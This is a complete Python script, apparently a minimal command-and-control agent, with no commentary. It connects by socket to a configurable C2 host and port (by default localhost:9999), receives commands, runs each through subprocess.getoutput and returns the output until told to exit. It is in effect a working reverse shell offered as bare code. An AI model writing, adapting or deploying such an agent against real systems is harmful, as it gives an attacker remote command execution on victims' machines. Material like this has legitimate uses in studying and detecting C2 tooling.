#!/usr/bin/env python3
import socket
import subprocess

def connect_to_c2(c2_host="127.0.0.1", c2_port=9999):
    s = socket.socket()
    s.connect((c2_host, c2_port))

    while True:
        command = s.recv(1024).decode()
        if command.lower() == "exit":
            break
        output = subprocess.getoutput(command)
        s.send(output.encode())

    s.close()

if __name__ == "__main__":
    connect_to_c2()
